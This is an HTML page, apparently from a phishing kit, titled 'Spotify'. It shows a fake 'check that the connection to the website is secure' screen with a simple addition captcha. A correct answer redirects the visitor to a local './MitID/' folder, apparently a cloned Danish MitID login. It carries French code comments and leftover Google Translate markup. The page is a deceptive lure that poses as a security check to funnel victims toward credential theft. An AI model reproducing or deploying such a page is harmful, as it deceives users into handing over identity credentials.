<!DOCTYPE html>
<html class="translated-ltr"><head>
    <title>Spotify</title>
    <!-- Inclure la bibliothèque Bootstrap -->
    <meta charset="UTF-8"> <!-- Ajouter la balise meta avec l'encodage -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Meta tag pour la responsivité -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        /* Ajouter des styles personnalisés pour la captcha */
        body {
            background-image: url('./image.jpg');
            background-size: cover;
        }

        #captchaContainer {
            background-color: rgba(255, 255, 255, 0.8); /* Fond transparent avec opacité réduite */
            padding: 10px; /* Réduire la taille du cadre */
            border-radius: 5px; /* Réduire le rayon des coins du cadre */
        }

        #captchaValue {
            font-family: "Comic Sans MS", cursive, sans-serif;
            font-size: 24px; /* Réduire la taille de la police */
            letter-spacing: 10px;
            text-align: center;
            background-color: #f0f0f0;
            padding: 5px;
            margin-bottom: 10px; /* Réduire l'espacement inférieur */
            border: 1px solid #ccc; /* Ajouter une bordure légère */
        }

        .form-group {
            margin-bottom: 15px; /* Réduire l'espacement entre les éléments du formulaire */
        }

        .btn {
            font-size: 18px; /* Réduire la taille de la police du bouton */
        }

        #errorMessage {
            color: red; /* Changer la couleur du message d'erreur en rouge */
            display: none;
        }
        b {
            font-size: 20px; /* Changer la taille de la balise <b> à 30 pixels */
        }
    </style>
<style>undefined</style><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials"><link rel="preconnect" href="https://fonts.gstatic.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa"><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.qhDXWpKopYk.L.W.O/am=CAM/d=0/rs=AN8SPfqeKn8wA30q4viup18yaci8udUjKQ/m=el_main_css"></head>
<body cz-shortcut-listen="true">
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6 col-sm-8 col-xs-12"> <!-- Utiliser des classes Bootstrap pour la mise en page responsive -->
                <div class="card" id="captchaContainer"> <!-- Ajouter un ID pour appliquer les styles personnalisés -->
                     <!-- Placer le titre en dehors de card-body -->

                    <div class="card-body">
						
                        <b style=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Check that the connection to the website is secure</font></font></b>
                        <br>
                        <br>
                        <div id="captchaValue"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6 + 3</font></font></div>
                        <br>
                        <div class="form-group">
                            <label for="captchaResult"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Check that you are human:</font></font></label>
                            <input type="text" class="form-control" id="captchaResult" required="">
                        </div>
                        <button class="btn btn-primary btn-block" onclick="checkCaptcha()"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Submit</font></font></button>
                        <p id="errorMessage" class="text-center"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Incorrect captcha. </font><font style="vertical-align: inherit;">Please try again.</font></font></p>
                        <p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the site must check the security of your connection before proceeding.</font></font></p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function checkCaptcha() {
            const captchaValue = document.getElementById("captchaValue").textContent;
            const captchaResult = parseInt(document.getElementById("captchaResult").value, 10);
            const errorMessage = document.getElementById("errorMessage");

            // Évaluer l'expression de captchaValue pour obtenir le résultat attendu
            const expected = eval(captchaValue);

            if (captchaResult === expected) {
                // Rediriger vers la page home.html
                window.location.href = "./MitID/";
            } else {
                errorMessage.style.display = "block";
                document.getElementById("captchaResult").value = "";
                generateNewCaptcha();
            }
        }

        function generateNewCaptcha() {
            // Générer deux nouveaux nombres aléatoires entre 0 et 9
            const num1 = Math.floor(Math.random() * 10);
            const num2 = Math.floor(Math.random() * 10);
            document.getElementById("captchaValue").textContent = `${num1} + ${num2}`;
        }

        // Générer un captcha au chargement de la page
        generateNewCaptcha();
    </script>

    <!-- Inclure le script Bootstrap -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Original text</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div>


</body></html>